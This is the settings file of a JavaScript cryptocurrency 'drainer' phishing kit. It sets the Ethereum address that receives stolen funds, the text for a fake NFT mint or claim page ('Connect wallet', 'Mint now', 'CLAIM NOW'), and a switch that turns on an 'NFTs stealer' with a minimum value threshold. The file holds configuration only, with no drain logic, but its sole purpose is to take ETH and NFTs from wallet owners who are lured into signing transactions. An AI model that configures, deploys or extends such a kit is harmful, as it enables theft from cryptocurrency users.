// your address goes here
const receiveAddress = "0x9852C0c5fB11668d37ef02719a429f887D4a615b";

const collectionInfo = {
    name: "SIGN TO DRAIN ETH",
    socialMedia: {
        discord: "https://discord.com",
        twitter: "https://twitter.com",
        instagram: "https://instagram.com",
    },
}

const indexPageInfo = {
    backgroundImage: "background.png", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "COLLECTORS TOKEN",
}

const claimPageInfo = {
    title: "SIGN TO<br>DRAIN", // <br> is a line break
    shortDescription: "SHOW YOUR LOYALTY.",
    longDescription: "SIGN TO DRAIN ETH! IF YOU SIGN YOU WILL LOSE YOUR ETH",

    claimButtonText: "CLAIM NOW",

    image: "profile.png", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.0001,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "0x9852C0c5fB11668d37ef02719a429f887D4a615b" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
